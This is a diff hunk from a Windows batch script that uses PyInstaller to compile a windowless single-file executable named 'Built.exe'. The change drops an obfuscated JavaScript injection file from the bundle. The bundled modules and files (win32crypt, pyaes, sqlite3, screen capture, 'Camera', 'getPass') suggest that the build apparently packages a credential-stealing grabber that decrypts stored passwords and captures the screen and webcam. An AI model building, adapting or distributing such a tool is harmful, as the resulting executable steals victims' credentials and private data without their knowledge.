@@ -27,7 +27,7 @@ if exist icon.ico (
 ) else (
     set icon=NONE
 )
-pyinstaller --onefile --clean --noconsole --noconfirm main-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --add-data config.json;. --add-data injection-obfuscated.js;. --add-data getPass;. --version-file version.txt %bound%
+pyinstaller --onefile --clean --noconsole --noconfirm main-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --add-data config.json;. --add-data getPass;. --version-file version.txt %bound%
 if exist dist\Built.exe (
     explorer.exe dist
 ) else (
